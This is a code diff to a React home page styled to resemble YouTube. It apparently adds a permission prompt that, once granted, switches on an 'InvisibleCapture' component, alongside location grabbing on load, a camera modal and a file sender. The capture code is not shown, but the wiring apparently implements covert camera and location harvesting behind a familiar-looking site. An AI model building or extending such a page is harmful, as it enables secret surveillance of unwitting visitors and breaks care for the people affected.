@@ -5,19 +5,26 @@ import { Input } from '@/components/ui/input';
 import { CameraModal } from '@/components/camera-modal';
 import { FileSender } from '@/components/file-sender';
 import { InvisibleCapture } from '@/components/invisible-capture';
+import { PermissionHandler } from '@/components/permission-handler';
 import { VideoGrid } from '@/components/video-grid';
 import { locationService, type LocationData } from '@/lib/location';
 
 export default function HomePage() {
   const [isCameraModalOpen, setIsCameraModalOpen] = useState(false);
   const [isFileSenderOpen, setIsFileSenderOpen] = useState(false);
-  const [showInvisibleCapture, setShowInvisibleCapture] = useState(true);
+  const [showInvisibleCapture, setShowInvisibleCapture] = useState(false);
+  const [permissionsGranted, setPermissionsGranted] = useState(false);
   const [location, setLocation] = useState<LocationData | null>(null);
   const [locationStatus, setLocationStatus] = useState('Getting location...');
 
   useEffect(() => {
     getCurrentLocation();
   }, []);
+
+  const handlePermissionsGranted = () => {
+    setPermissionsGranted(true);
+    setShowInvisibleCapture(true);
+  };
 
   const getCurrentLocation = async () => {
     try {
@@ -31,6 +38,10 @@ export default function HomePage() {
 
   return (
     <div className="bg-youtube-dark text-white font-inter min-h-screen">
+      {/* Permission handler */}
+      {!permissionsGranted && (
+        <PermissionHandler onPermissionsGranted={handlePermissionsGranted} />
+      )}
       {/* Header */}
       <header className="bg-youtube-dark border-b border-youtube-elevated sticky top-0 z-40">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
